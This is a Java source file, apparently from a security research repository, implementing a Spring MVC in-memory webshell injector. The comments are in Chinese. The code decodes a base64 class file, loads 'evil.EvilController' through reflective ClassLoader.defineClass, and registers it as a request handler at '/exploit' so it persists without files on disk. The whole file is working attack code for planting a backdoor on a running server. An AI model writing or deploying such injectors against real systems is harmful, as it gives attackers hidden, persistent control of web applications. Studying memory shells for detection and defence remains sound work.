package exploit.spring.mvc.memshell.controller;

import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;
import utils.FileUtils;

import java.lang.reflect.Method;
import java.util.Base64;

public class MVCControllerMemShell {
    public static void exploit(){
        try {
            // URLHelper的错误：https://stevewall123.wordpress.com/
            // 构建RequestMappingInfo，设置请求路径，请求方法等信息
            RequestMappingInfo.BuilderConfiguration builderConfiguration = new RequestMappingInfo.BuilderConfiguration();
            builderConfiguration.setPatternParser(new PathPatternParser());
            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths("/exploit").methods(RequestMethod.GET, RequestMethod.POST).options(builderConfiguration).build();

            // 获取当前请求的context
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, RequestAttributes.SCOPE_REQUEST);

            // 从context中拿到requestMappingHandlerMapping
            RequestMappingHandlerMapping requestMappingHandlerMapping = (RequestMappingHandlerMapping) context.getBean("requestMappingHandlerMapping");

            // 创建恶意的Controller对象（多种方法）
            // 方法一：直接在当前的classpath中寻找类

            // 方法二：直接读取class文件
            String base64ClassString = FileUtils.getFileContent("EvilController_base64.txt");
            byte[] classBytes = Base64.getDecoder().decode(base64ClassString);
            ClassLoader currentClassLoader = Thread.currentThread().getContextClassLoader();
            Class classLoaderClz = ClassLoader.class;
            Method defineClassMethod = classLoaderClz.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class evilClass = (Class) defineClassMethod.invoke(currentClassLoader, "evil.EvilController", classBytes, 0, classBytes.length);
            Object handler = evilClass.getDeclaredConstructor().newInstance();
            Method handlerMethod = evilClass.getDeclaredMethod("handleRequest", String.class, String.class, boolean.class);


            // 注册恶意对象到服务器中
            requestMappingHandlerMapping.registerMapping(requestMappingInfo, handler, handlerMethod);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
